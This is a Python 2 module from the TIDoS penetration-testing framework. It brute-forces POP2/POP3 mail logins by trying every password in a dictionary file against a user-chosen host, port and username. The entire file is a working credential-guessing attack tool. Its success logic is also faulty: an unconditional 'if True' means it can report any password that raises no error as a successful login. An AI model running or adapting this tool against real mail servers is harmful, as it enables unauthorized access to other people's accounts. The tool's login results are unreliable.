#!/usr/bin/env python2
#-*- coding: utf-8 -*-

#-:-:-:-:-:-:-:-:-:-:-:-:#
#    TIDoS Framework     #
#-:-:-:-:-:-:-:-:-:-:-:-:#

#Author : @_tID
#This module requires TIDoS Framework
#https://github.com/the-Infected-Drake/TIDoS-Framework 

import poplib
import time
import socket
from colors import *
 
def popbrute(web):
	
	web = web.replace('http://','')
	web = web.replace('https://','')
	print R+'\n   ==================================='
	print R+'    P O P 2/3   B R U T E F O R C E R'
	print R+'   ===================================\n'
	try:
	    print GR+' [*] Testing target...'
	    time.sleep(0.5)
	    ip = socket.gethostbyname(web)
	    print G+' [+] Target appears online...\n'
	    print O+' Choose the port number :\n'
	    print C+'   PORT     PROTOCOL'
	    print C+'   ====     ========'
	    print B+'   109        POP2'
	    print B+'   110        POP3'
	    port = raw_input(GR+'\n [#] Enter the port :> ')
	    user = raw_input(GR+' [#] Enter the default username (eg. root/admin) :> ')
	    
	    pop = poplib.POP3(ip,int(port)) 

	    with open('files/pass.dicc','r') as passwords:
		for password in passwords:
			password=password.replace("\n","")
			try:
				pop.user(str(user))
				pop.pass_(password)
				if True:
					print G+' [!] Successful login with ' +O+user+G+ ' and ' +O+password
					break
			except:
	    			print C+' [!] Checking '+B+user+C+' and '+B+password

	except:
	    print R+' [-] Target seems to be down or port is closed!'

